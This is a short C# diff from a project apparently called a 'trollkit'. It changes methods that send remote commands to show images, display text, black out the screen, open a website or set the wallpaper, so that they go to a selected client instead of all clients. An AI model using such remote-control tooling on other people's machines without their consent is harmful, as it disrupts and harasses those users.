@@ -44,26 +44,26 @@ namespace Trollkit_Library.ViewModels.Commands
 
 				string base64 = Convert.ToBase64String(bytes);
 				TransferCommandObject returnObject = new TransferCommandObject { Command = "ShowImage", Handler = handler, Value = base64 };
-				_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+				_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 			}
 		}
 
 		private void SendDisplayText()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "TextBox", Handler = handler, Value = BroadcastMessageText };
-			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
 		private void SendTurnOffScreen()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "BlackScreen", Handler = handler };
-			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
 		private void SendOpenSite()
 		{
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "OpenSite", Handler = handler, Value = OpenUrlText };
-			_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 
 		private void SendPickBackgroundImage()
@@ -79,7 +79,7 @@ namespace Trollkit_Library.ViewModels.Commands
 				string base64 = Convert.ToBase64String(bytes);
 
 				TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = base64 };
-				_server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+				_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 			}
 		}
 	}
